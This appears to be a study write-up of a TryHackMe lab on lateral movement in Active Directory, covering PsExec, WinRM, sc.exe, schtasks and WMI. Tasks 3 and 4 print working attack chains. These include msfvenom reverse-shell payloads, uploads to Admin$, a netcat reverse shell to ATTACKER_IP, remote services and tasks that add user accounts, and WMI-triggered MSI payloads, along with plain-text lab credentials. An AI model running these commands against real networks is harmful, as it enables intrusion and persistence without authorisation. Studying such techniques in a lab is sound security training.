# Lateral Movement and Pivoting

## Task 1 Introduction

The room teaches lateral movement techniques used by attackers after gaining an initial foothold in an Active Directory (AD) environment. You’ll learn how attackers move between hosts with minimal detection, use alternative authentication materials, and pivot through compromised machines. Completing the Breaching AD and Enumerating AD rooms first is recommended.

### Networking Setup

#### AttackBox

- If using the web-based AttackBox, you’re auto‑connected to the network.
- You must manually configure DNS to resolve AD hostnames:
```
sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
```
- Test DNS with:
```
nslookup thmdc.za.tryhackme.com
```
- DNS resets every ~3 hours, so you may need to repeat the setup.
- Record your lateralmovement interface IP — this is your attacker IP for reverse shells.

#### Own Machine (OpenVPN)

- Download the VPN config from the access page.
- Connect using:
```
sudo openvpn user-lateralmovementandpivoting.ovpn
```
- After “Initialization Sequence Completed,” verify connection on the access page.
- DNS must still be configured manually.

#### Kali VM

- Use Network Manager GUI to set DNS to the THMDC IP.
- Add a secondary DNS (e.g., 1.1.1.1) for internet access.
- Restart NetworkManager.
- Test DNS by visiting:
```
http://distributor.za.tryhackme.com/creds
```

### Getting Initial Credentials

- Visit the distributor site to obtain your AD username/password.
- These credentials allow SSH access to:
```
thmjmp2.za.tryhackme.com
```
using:
```
ssh za\<username>@thmjmp2.za.tryhackme.com
```
This jump host simulates your initial foothold in the environment.

### Reverse Shell Note
Always use the IP of the lateralmovement interface as your attacker IP for any reverse connections.


## Task 2 Summary: Moving Through the Network

### What Lateral Movement Is

Lateral movement refers to the techniques attackers use to move between systems inside a network after gaining an initial foothold. Attackers do this to:

- Reach their ultimate objectives
- Bypass network segmentation and restrictions
- Create additional access points
- Confuse defenders and reduce detection

Rather than a single step in a kill chain, lateral movement is a repeating cycle:
Gain access → extract credentials → move to a new host → escalate → extract more credentials → repeat.

```
+---------------------------------------------------------------+
|                                                               |
|   [ Initial Recon ] → [ Initial Compromise ] → [ Foothold ]   |
|                                                               |
|                 ↓                 ↓                 ↓          |
|             [ Escalate Privileges ] → [ Internal Recon ]       |
|                                      ↘                        |
|                                       [ Move Laterally ]      |
|                                        ↘                      |
|                                         [ Maintain Presence ] |
|                                          ↘                    |
|                                           [ Complete Mission ]|
|                                                               |
+---------------------------------------------------------------+

Cycle Summary:
---------------------------------------------------------------
1. Initial Recon        → Gather information about the target.
2. Initial Compromise   → Gain first access (e.g., phishing).
3. Establish Foothold   → Deploy persistence or malware.
4. Escalate Privileges  → Gain higher-level access.
5. Internal Recon       → Map internal network and assets.
6. Move Laterally       → Spread to other systems.
7. Maintain Presence    → Ensure continued access.
8. Complete Mission     → Achieve attacker’s goal.
---------------------------------------------------------------
```

Attackers often need several cycles before reaching high‑value systems.


### Example Scenario

A phishing compromise lands the attacker on a Marketing workstation, which is heavily restricted. To reach an internal code repository, the attacker:

1. Elevates privileges on the Marketing PC
2. Extracts local admin hashes
3. Identifies another host: DEV‑001‑PC
4. Uses the reused local admin hash to access DEV‑001‑PC
5. From the developer’s machine, reaches the code repository

Path 1 (successful, stealthy):  
Marketing-PC → DEV-001-PC (using local admin hash) → Code Repo

Path 2 (blocked by firewall):  
Marketing-PC → Firewall → Code Repo / admin services (denied)

Path 3 (conceptual, “too noisy”):  
Marketing-PC → Code Repo directly (would be suspicious in logs even if allowed)
```
                  [ Attacker ]
                      |
                      v
                +----------------+
                |  Marketing-PC  |
                +----------------+
                  /      |      \
                 /       |       \
                v        |        v
      (1) Local Admin    |  (3) Direct to
          Hash reuse     |      Code Repo
                         |
        +----------------+----------------+
        |     Firewall (Marketing rules)  |
        +----------------+----------------+
                         |
          (2) Blocked to Code Repo / Admin
                         v
                   +-----------+
                   | Code Repo |
                   +-----------+


(1) Marketing-PC --------------> DEV-001-PC (via reused local admin hash)
                                  |
                                  v
                             +-----------+
                             | Code Repo |
                             +-----------+
```

Even if Marketing had direct access, using the developer’s machine is less suspicious in audit logs.


### Attacker Techniques

Attackers can move laterally using:

- Standard administrative protocols: WinRM, RDP, VNC, SSH
- More stealthy techniques covered later in the room

They try to mimic realistic user behaviour to avoid detection (e.g., IT staff accessing servers is normal; Marketing PC accessing DEV‑001‑PC is suspicious).


### Administrators & UAC
Two types of admin accounts matter:

- Local admin accounts (on the machine)
- Domain accounts with local admin rights

Key difference: User Account Control (UAC) restricts local admins (except the built‑in Administrator).

- Local admins connecting remotely via RPC/SMB/WinRM receive a filtered medium‑integrity token, blocking privileged actions.
- Domain admins with local admin rights get full privileges remotely.

If a lateral movement technique fails, UAC restrictions on a non‑default local admin may be the reason. 

### Summary of UAC and Remote Restrictions in Windows Vista

#### Purpose of UAC

User Account Control (UAC) in Windows Vista ensures users—even those in the local Administrators group—run most tasks with least‑privilege rights. When an administrative action is required, Vista prompts for approval.

### How Remote Restrictions Work

UAC applies special rules to remote connections to prevent:

- Loopback attacks
- Local malware gaining remote administrative rights

Local Accounts (SAM)

- A local Administrator connecting remotely (e.g., via net use \\computer\share$) does NOT receive full admin rights.
- Their token is filtered, meaning no elevation and no ability to perform admin tasks.
- To administer remotely using a local account, they must log in interactively (Remote Desktop / Remote Assistance).

### Domain Accounts

- Domain users who are Administrators do receive full admin tokens when connecting remotely.
- UAC remote restrictions do not apply to domain accounts.
- This behavior matches Windows XP.

### Disabling UAC Remote Restrictions

Controlled via the registry value:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```
- 0 (default): Local admins get a filtered token (no elevation).
- 1: Local admins get an elevated token (full admin rights remotely).
- Setting the value to 1 disables UAC remote restrictions.



## Task 3: Spawning Processes Remotely — Summary + ASCII Diagrams

Attackers with valid credentials can execute commands on remote Windows hosts using several built‑in mechanisms. Each technique uses different protocols and behaves differently, making some methods more stealthy or more reliable depending on the environment.

### 1. PsExec (SMB / Service Execution)

Ports: 445 (SMB)
Required: Local/Domain Administrator
PsExec uploads a temporary service executable, starts it, and communicates through named pipes.

#### ASCII Diagram — PsExec Flow
```
[ Attacker ]                          [ Target ]
      |                                   |
      |-- SMB (445) --------------------->|
      |                                   |
      |  Upload psexesvc.exe to Admin$    |
      |---------------------------------->|
      |                                   |
      |  Create & start PSEXESVC service  |
      |---------------------------------->|
      |                                   |
      |<-- Named Pipe: \\.\pipe\psexesvc --|
      |     stdin / stdout / stderr       |
```
Command example: (MACHINE_IP is PC laterally connecting to)
```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### 2. WinRM (Remote PowerShell Execution)

Ports: 5985 (HTTP), 5986 (HTTPS)
Required: Remote Management Users

WinRM allows remote PowerShell sessions or remote script execution.

#### ASCII Diagram — WinRM Flow
```
[ Attacker ] -- WinRM HTTP/HTTPS --> [ Target ]
      |                                   |
      |  Auth via PSCredential            |
      |---------------------------------->|
      |                                   |
      |  Enter-PSSession / Invoke-Command |
      |---------------------------------->|
      |                                   |
      |<----------- Command Output -------|
```
Examples:
```
winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```
### 3. sc.exe (Remote Service Creation via RPC or SMB Pipes)

Ports:

- 135 (RPC Endpoint Mapper)
- 49152–65535 (Dynamic RPC ports)
- 445 / 139 (SMB Named Pipes)
  Required: Administrators

Windows services can run arbitrary commands when started. sc.exe connects to the Service Control Manager (SVCCTL) using RPC or SMB pipes.

#### ASCII Diagram — RPC → SVCCTL
```
[ Attacker ] -- RPC 135 --> [ Endpoint Mapper ]
      |                         |
      |   "Where is SVCCTL?"    |
      |------------------------>|
      |                         |
      |<-- "SVCCTL at port 50xxx" 
      |
[ Attacker ] -- RPC 50xxx --> [ SVCCTL ]
      |                         |
      |  Create / Start Service |
      |------------------------>|
```

#### ASCII Diagram — SMB Named Pipe Fallback
```
[ Attacker ] -- SMB (445/139) --> [ Target ]
      |                                 |
      | Bind to \\pipe\svcctl            |
      |--------------------------------->|
      | Create / Start Service           |
```

Example:
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

### 4. schtasks (Remote Scheduled Task Execution)

Scheduled tasks can run commands remotely under SYSTEM.

#### ASCII Diagram — Scheduled Task Execution
```
[ Attacker ] -- schtasks --> [ Target ]
      |                           |
      | Create THMtask1 (SYSTEM)  |
      |-------------------------->|
      |                           |
      | Run task manually         |
      |-------------------------->|
      |                           |
      |<-- No output (blind exec) |
```

Example:
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE
schtasks /s TARGET /run /TN "THMtask1"
```

### Putting It All Together — Full Attack Chain (Exercise)

1. Generate a service‑safe reverse shell payload ():
```
msfvenom -p windows/shell/reverse_tcp -f exe-service \
LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```
2. Upload payload to THMIIS Admin$ share (PC we laterally move to):
```
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA \
'//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```
3. Start listener (try with and without \ for next line if fails):
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; \
set LHOST lateralmovement; set LPORT 4444; exploit"
```
4. Use runas (/netonly) to spawn a second reverse shell with the stolen token:
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers \
"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```
5. Receive shell:
```
nc -lvp 4443
```
6. Create remote service pointing to uploaded payload (the persistence element keep shell open):
```
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```
7. Reverse shell fires → access THMIIS → run flag.exe. 


## Task 4: Moving Laterally Using WMI

### What WMI Is

Windows Management Instrumentation (WMI) is Microsoft’s implementation of WBEM, allowing administrators to remotely manage systems.
Attackers abuse WMI for lateral movement, remote process execution, service creation, scheduled tasks, and MSI installation.

### How to Connect to WMI (PowerShell)

1. Create PSCredential object

```
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

2. Choose protocol

- DCOM → RPC (ports 135 + 49152–65535)
- WSMAN → WinRM (ports 5985/5986)

3. Create WMI session

```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Remote Process Creation (WMI)

PowerShell
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"
}
```
Legacy WMIC
```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```
WMI does not return command output — it silently spawns the process.

### Remote Service Creation (WMI)

Create service
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2"
    DisplayName = "THMService2"
    PathName = "net user munra2 Pass123 /add"
    ServiceType = [byte]::Parse("16")
    StartMode = "Manual"
}
```

Start service
```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop + delete
```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Remote Scheduled Task Creation (WMI)
```
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Delete task:
```
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

###  Installing MSI Packages via WMI

If you copy an MSI to the target (e.g., via SMB to ADMIN$ → C:\Windows\):

PowerShell
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"
    Options = ""
    AllUsers = $false
}
```

Legacy WMIC
```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```
This is used to execute a reverse shell MSI payload.

### TryHackMe Task Flow (Your Exercise)

- SSH into THMJMP2 using your AD credentials.
- Use the provided admin creds:
  - User: ZA.TRYHACKME.COM\t1_corine.waters
  - Pass: Korine.1994
- Create MSI payload with msfvenom on AttackBox.
- Upload MSI to THMIIS via SMB → goes to C:\Windows\.
- Start Metasploit handler.
- Create WMI session from THMJMP2.
- Invoke MSI installation via WMI → triggers reverse shell.
- On THMIIS reverse shell, run flag.exe on t1_corine.waters desktop.
- Submit the flag.
